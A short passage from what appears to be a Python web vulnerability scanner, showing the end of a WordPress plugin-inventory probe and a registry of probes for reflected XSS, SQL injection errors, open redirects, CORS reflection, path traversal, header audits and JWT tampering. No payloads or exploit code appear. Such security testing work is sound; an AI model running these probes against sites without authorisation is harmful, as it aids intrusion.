        ev = Evidence(request=f"GET {base}/wp-content/plugins/ + readme.txt",
                      response_excerpt=" | ".join(inventory)[:500])
        return ProbeOutput("wp_plugins", url, verdict, ev)

    # ------------------------------------------------------------------
    REGISTRY = {
        "xss_reflect": xss_reflect,
        "sqli_error": sqli_error,
        "open_redirect": open_redirect,
        "cors_reflect": cors_reflect,
        "traversal": traversal,
        "header_audit": header_audit,
        "jwt_probe": jwt_probe,
        "jwt_tamper": jwt_tamper,
        "wp_plugins": wp_plugins,
    }
